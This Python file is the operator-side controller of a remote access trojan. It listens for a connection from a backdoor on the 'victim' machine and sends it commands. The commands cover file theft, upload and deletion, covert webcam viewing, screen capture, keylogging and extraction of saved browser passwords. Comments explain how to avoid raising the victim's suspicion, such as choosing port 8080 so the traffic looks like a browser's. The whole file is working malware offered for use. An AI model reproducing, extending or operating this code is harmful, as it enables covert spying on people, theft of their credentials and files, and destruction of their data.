from json import encoder
import os
from dotenv import load_dotenv
load_dotenv()
import socket
#making a socket object
s=socket.socket()

#getting host name (can also be taken manually : ip address of attacker)
host=os.getenv("MASTER_HOST")
#port ot be used use 8080 or 80 to make it look like browser
port=8080
s.bind((host,port))
print("\n waiting for connection")
#listening for connection
s.listen()
conn, addr=s.accept()
print(addr,"has connected")
conn.recv(1024)


#connection has been completed now we send and recieve data
while (1):
    command=input(str("command >>"))
    command=command.strip()
    #sending command to slave
    conn.send(command.encode())
    if command == "help" or command == "h":
        print("Help menu:")

        print("\t Basic commands:")
        print("\t\t h \t\t show this menu")
        print("\t\t help \t\t show this menu")
        print("\t\t quit \t\t to quit (will only close on your end)")
        print("\t\t q \t\t to quit (will only close on your end)")
        print("\t\t terminate \t\t to close conenction and remove backdoor from remote host")


        print("\n\t OS commands:")
        print("\t\t os \t\t to get Operating system details")
    

        print("\n\t File commands:")
        print("\t\t pwd \t\t view current working directory")
        print("\t\t show \t\t view all files in particular directories")
        print("\t\t send file \t\t send files to victim")
        print("\t\t download file\t get files from victim")
        print("\t\t remove file \t remove files from victim computer")
        print("\t\t remove folder \t remove folders from victim computer")
        
        
        print("\n\t Advanced commands:")
        print("\t\t camera \t To open remote hosts camera \n\t\t\t\t <press q to quit>\n\t\t\t\t <Beware remote host might get suspicious becuase of their camera light turning on>\n\t\t\t\t <To reuse this command reconnect to remote host using quit command (see help menu)>")
        print("\t\t screenshare \t To see remote hosts Screen <Enter stop to stop screenshare>")
        print("\t\t keylogger start \t To activate keylogger <Enter stop to stop keylogger>")
        print("\t\t keylogger get \t To get file made by keylogger and remove it from remote host")
        print("\t\t browser \t To get all saved passwords from user browser")


    #Basic commands
    elif command == "q" or command == "quit":
        conn.close()
        print("Remote host will try to connect every 13 seconds run this file again to connect")
        print("If you see port busy error please wait 60 seconds before running this file again")
        break
    
    elif command =="terminate":
        break

    #Os commands
    elif command =="os":
        try:
            result=conn.recv(2048)
            print(result.decode())
        except:
            print("Error occured might lose connection with remote host")

    #File commands section
    elif command =="pwd":
        # try:
            #now we recieve data; and store it in files variable; we assume maximum data will be 5000 bytes
            dir=conn.recv(5000)
            print(dir.decode())
        # except:
        #     print("Error occured might lose connection with remote host")

    elif command == "show" or command == "ls":
        try:
            #input of dir we wanna see in 
            dirname=str(input(str("\t Enter directory you wanna search in >> ")))
            #encoding dir name
            dirname=dirname.encode()
            #sending directory name
            conn.send(dirname)
            #receiving list
            result=conn.recv(5000)
            #printing decoded list
            if result.decode() == "path_not_found":
                print("Path does not exists on remote host")
            else:
                print(result.decode())
        except:
            print("Error occured might lose connection with remote host")

    elif command == "send file":
        try:
            #taking file path from user
            path_i=input("\tEnter path to file >> ")
            #checking if file exists
            if os.path.isfile(path_i):
                #taking where user wants to send these files in remote system
                path_o=input("\tEnter path (with full file name) where file should go >> ")
                #reading file
                f = open(path_i, "rb")
                data=f.read()
                #sending path where user wants file to go to target
                conn.send(path_o.encode())
                #waiting for a random response to wait till remote computer has executed its commands
                result=conn.recv(1024)
                #sending file data to remote computer
                conn.send(data)
                print("File sent!")
                f.close()
            else:
                print("Path not Found!")
                print("please enter following commands next:")
                print("\t\t system")
                print("\t\t <random variables : do not enter any specific message as this can raise suspicion on remote host eg of txt : XSdwebD45>")
                print("\t\t you might see command not found do not worry about it")
                print("\t\t this is a bug will be removed in future versions")
        except:
            print("Error occured might lose connection with remote host")

        
    elif command == "download file":
        try:
            #taking file path from user
            path_i=input("\tEnter path to file you want to download >> ")
            #taking where user wants to send these files in remote system
            path_o=input("\tEnter path (with full file name) where file should go in your system >> ")
            #sending path from where file needs to be downloaded
            conn.send(path_i.encode())
            #getting file data
            f=conn.recv(10000)
            if f.decode() == "not_found":
                print("Path not found on remte host")
            else:
                #creating new file
                newfile=open(path_o,"wb")
                #writing data in above created file
                newfile.write(f)
                #closing just written file
                newfile.close()
                print("File recieved!")
        except:
            print("Error occured might lose connection with remote host")

    elif command == "remove file":
        try:
            path_rm=input("\tInput path to file you want to delete >> ")
            conn.send(path_rm.encode())
            result=conn.recv(1024)
            result=result.decode()
            if result == "deleted":
                print("\tFiles deleted!")
            else:
                print("\tPath does not exist on remote host!")
        except:
            print("Error occured might lose connection with remote host")

    elif command == "remove folder":
        try:
            location=input("Enter path you want to delete >> ")
            conn.send(location.encode())
            check=conn.recv(1024)
            if check.decode() == "present":
                print("\tpath has been removed")
            else:
                print("\tSpecified path doesnt exist!")
        except:
            print("\tSome error occured please try again!")


    #Advanced Section
    elif command == "camera":
        try:
            import cv2,struct,pickle
            #we use open cv to access camera
            data=b""
            flag=0
            payload_size=struct.calcsize("Q")
            print("Opening in 3...")
            #to keep getting camera feed
            while True:
                #code to get video frames
                while (len(data)<payload_size):
                    packet=conn.recv(4*1024)
                    if not packet:break
                    data+=packet
                if flag ==0:
                    print("Opening in 2...")
                packed_msg_size=data[:payload_size]
                data=data[payload_size:]
                msg_size=struct.unpack("Q",packed_msg_size)[0]
                while len(data) < msg_size:
                    data+=conn.recv(4*1024)
                frame_data=data[:msg_size]
                data=data[msg_size:]
                frame=pickle.loads(frame_data)
                if flag ==0:
                    print("Opening in 1...")
                    flag=1
                #To show video stram coming to us 
                cv2.imshow("RECIEVING",frame)
                #to check if user presses q to quit
                key=cv2.waitKey(1) & 0xFF
                if key == ord("q"):
                    conn.send("q".encode())
                    cv2.destroyAllWindows()
                    break
                else:
                    conn.send("nq".encode())
        except:
            print("Remote host doesn't have a camera installed")

    elif command == "screenshare":
        from vidstream import StreamingServer
        import threading

        recv = StreamingServer(os.environ.get("MASTER_HOST"), 9999)
        t = threading.Thread(target=recv.start_server)
        t.start()
        while input("") != "stop":
            continue
        recv.stop_server()

    elif command == 'keylogger start':
        while input("") != "stop":
            conn.send("stop".encode())
            break
    
    elif command == 'keylogger get':
        try:
            data=conn.recv(1024)
            if data.decode() == "not_found":
                print("File not found on remote host !")
            else:
                #creating new file
                newfile=open("keylogger.txt","wb")
                #writing data in above created file
                newfile.write(data)
                #closing just written file
                newfile.close()
                print("File recieved!")
        except:
            print("Error occured might lose connection with remote host")

    elif command == 'browser':
        data = conn.recv(99999999)
        newfile=open("browser.txt","w")
        newfile.write(data.decode())
        newfile.close()
        print("Data Recieved!")
    else:
        print("unknown command")


